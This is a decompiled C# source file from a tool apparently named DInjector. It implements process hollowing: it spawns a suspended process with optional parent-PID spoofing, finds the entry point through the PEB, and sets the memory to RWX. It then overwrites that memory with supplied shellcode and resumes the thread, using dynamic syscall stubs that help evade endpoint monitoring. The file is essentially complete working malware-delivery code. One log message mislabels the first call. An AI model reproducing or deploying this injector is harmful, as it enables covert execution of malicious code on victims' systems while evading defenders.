using System;
using System.Runtime.InteropServices;
using DInvoke.Data;
using DInvoke.DynamicInvoke;

namespace DInjector
{
	// Token: 0x0200000E RID: 14
	internal class ProcessHollow
	{
		// Token: 0x0600002F RID: 47 RVA: 0x00003C7C File Offset: 0x00001E7C
		public static void Execute(byte[] shellcodeBytes, string processImage, int ppid = 0, bool blockDlls = false)
		{
			Win32.ProcessThreadsAPI._PROCESS_INFORMATION process_INFORMATION = SpawnProcess.Execute(processImage, "C:\\Windows\\System32", true, ppid, blockDlls);
			ProcessHollow.NtQueryInformationProcess ntQueryInformationProcess = (ProcessHollow.NtQueryInformationProcess)Marshal.GetDelegateForFunctionPointer(Generic.GetSyscallStub("NtQueryInformationProcess"), typeof(ProcessHollow.NtQueryInformationProcess));
			IntPtr hProcess = process_INFORMATION.hProcess;
			DInvoke.Data.Native.PROCESS_BASIC_INFORMATION process_BASIC_INFORMATION = default(DInvoke.Data.Native.PROCESS_BASIC_INFORMATION);
			uint num = 0U;
			DInvoke.Data.Native.NTSTATUS ntstatus = ntQueryInformationProcess(hProcess, DInvoke.Data.Native.PROCESSINFOCLASS.ProcessBasicInformation, ref process_BASIC_INFORMATION, (uint)(IntPtr.Size * 6), ref num);
			if (ntstatus == DInvoke.Data.Native.NTSTATUS.Success)
			{
				Console.WriteLine("(ProcessHollow) [+] NtAllocateVirtualMemory");
			}
			else
			{
				Console.WriteLine(string.Format("(ProcessHollow) [-] NtAllocateVirtualMemory: {0}", ntstatus));
			}
			ProcessHollow.NtReadVirtualMemory ntReadVirtualMemory = (ProcessHollow.NtReadVirtualMemory)Marshal.GetDelegateForFunctionPointer(Generic.GetSyscallStub("NtReadVirtualMemory"), typeof(ProcessHollow.NtReadVirtualMemory));
			IntPtr baseAddress = (IntPtr)((long)process_BASIC_INFORMATION.PebBaseAddress + 16L);
			IntPtr intPtr = Marshal.AllocHGlobal(IntPtr.Size);
			uint num2 = 0U;
			ntstatus = ntReadVirtualMemory(hProcess, baseAddress, intPtr, (uint)IntPtr.Size, ref num2);
			if (ntstatus == DInvoke.Data.Native.NTSTATUS.Success)
			{
				Console.WriteLine("(ProcessHollow) [+] NtReadVirtualMemory");
			}
			else
			{
				Console.WriteLine(string.Format("(ProcessHollow) [-] NtReadVirtualMemory: {0}", ntstatus));
			}
			byte[] array = new byte[num2];
			Marshal.Copy(intPtr, array, 0, (int)num2);
			Marshal.FreeHGlobal(intPtr);
			IntPtr intPtr2 = (IntPtr)BitConverter.ToInt64(array, 0);
			IntPtr intPtr3 = Marshal.AllocHGlobal(512);
			ntstatus = ntReadVirtualMemory(hProcess, intPtr2, intPtr3, 512U, ref num2);
			if (ntstatus == DInvoke.Data.Native.NTSTATUS.Success)
			{
				Console.WriteLine("(ProcessHollow) [+] NtReadVirtualMemory");
			}
			else
			{
				Console.WriteLine(string.Format("(ProcessHollow) [-] NtReadVirtualMemory: {0}", ntstatus));
			}
			byte[] array2 = new byte[num2];
			Marshal.Copy(intPtr3, array2, 0, (int)num2);
			Marshal.FreeHGlobal(intPtr3);
			uint startIndex = BitConverter.ToUInt32(array2, 60) + 40U;
			uint num3 = BitConverter.ToUInt32(array2, (int)startIndex);
			IntPtr intPtr4 = (IntPtr)((long)intPtr2 + (long)((ulong)num3));
			ProcessHollow.NtProtectVirtualMemory ntProtectVirtualMemory = (ProcessHollow.NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(Generic.GetSyscallStub("NtProtectVirtualMemory"), typeof(ProcessHollow.NtProtectVirtualMemory));
			IntPtr intPtr5 = intPtr4;
			IntPtr intPtr6 = (IntPtr)shellcodeBytes.Length;
			uint newProtect = 0U;
			ntstatus = ntProtectVirtualMemory(hProcess, ref intPtr5, ref intPtr6, 64U, out newProtect);
			if (ntstatus == DInvoke.Data.Native.NTSTATUS.Success)
			{
				Console.WriteLine("(ProcessHollow) [+] NtProtectVirtualMemory, PAGE_EXECUTE_READWRITE");
			}
			else
			{
				Console.WriteLine(string.Format("(ProcessHollow) [-] NtProtectVirtualMemory, PAGE_EXECUTE_READWRITE: {0}", ntstatus));
			}
			ProcessHollow.NtWriteVirtualMemory ntWriteVirtualMemory = (ProcessHollow.NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(Generic.GetSyscallStub("NtWriteVirtualMemory"), typeof(ProcessHollow.NtWriteVirtualMemory));
			IntPtr intPtr7 = Marshal.AllocHGlobal(shellcodeBytes.Length);
			Marshal.Copy(shellcodeBytes, 0, intPtr7, shellcodeBytes.Length);
			uint num4 = 0U;
			ntstatus = ntWriteVirtualMemory(hProcess, intPtr4, intPtr7, (uint)shellcodeBytes.Length, ref num4);
			if (ntstatus == DInvoke.Data.Native.NTSTATUS.Success)
			{
				Console.WriteLine("(ProcessHollow) [+] NtWriteVirtualMemory");
			}
			else
			{
				Console.WriteLine(string.Format("(ProcessHollow) [-] NtWriteVirtualMemory: {0}", ntstatus));
			}
			uint num5;
			ntstatus = ntProtectVirtualMemory(hProcess, ref intPtr5, ref intPtr6, newProtect, out num5);
			if (ntstatus == DInvoke.Data.Native.NTSTATUS.Success)
			{
				Console.WriteLine("(ProcessHollow) [+] NtProtectVirtualMemory, oldProtect");
			}
			else
			{
				Console.WriteLine(string.Format("(ProcessHollow) [-] NtProtectVirtualMemory, oldProtect: {0}", ntstatus));
			}
			ProcessHollow.NtResumeThread ntResumeThread = (ProcessHollow.NtResumeThread)Marshal.GetDelegateForFunctionPointer(Generic.GetSyscallStub("NtResumeThread"), typeof(ProcessHollow.NtResumeThread));
			uint num6 = 0U;
			ntstatus = ntResumeThread(process_INFORMATION.hThread, ref num6);
			if (ntstatus == DInvoke.Data.Native.NTSTATUS.Success)
			{
				Console.WriteLine("(ProcessHollow) [+] NtResumeThread");
				return;
			}
			Console.WriteLine(string.Format("(ProcessHollow) [-] NtResumeThread: {0}", ntstatus));
		}

		// Token: 0x02000042 RID: 66
		// (Invoke) Token: 0x0600009A RID: 154
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, Win32.Advapi32.CREATION_FLAGS dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref Win32.ProcessThreadsAPI._STARTUPINFO lpStartupInfo, out Win32.ProcessThreadsAPI._PROCESS_INFORMATION lpProcessInformation);

		// Token: 0x02000043 RID: 67
		// (Invoke) Token: 0x0600009E RID: 158
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate DInvoke.Data.Native.NTSTATUS NtQueryInformationProcess(IntPtr ProcessHandle, DInvoke.Data.Native.PROCESSINFOCLASS ProcessInformationClass, ref DInvoke.Data.Native.PROCESS_BASIC_INFORMATION ProcessInformation, uint ProcessInformationLength, ref uint ReturnLength);

		// Token: 0x02000044 RID: 68
		// (Invoke) Token: 0x060000A2 RID: 162
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate DInvoke.Data.Native.NTSTATUS NtReadVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, IntPtr Buffer, uint NumberOfBytesToRead, ref uint NumberOfBytesReaded);

		// Token: 0x02000045 RID: 69
		// (Invoke) Token: 0x060000A6 RID: 166
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate DInvoke.Data.Native.NTSTATUS NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, out uint OldProtect);

		// Token: 0x02000046 RID: 70
		// (Invoke) Token: 0x060000AA RID: 170
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate DInvoke.Data.Native.NTSTATUS NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, IntPtr Buffer, uint BufferLength, ref uint BytesWritten);

		// Token: 0x02000047 RID: 71
		// (Invoke) Token: 0x060000AE RID: 174
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate DInvoke.Data.Native.NTSTATUS NtResumeThread(IntPtr ThreadHandle, ref uint SuspendCount);
	}
}
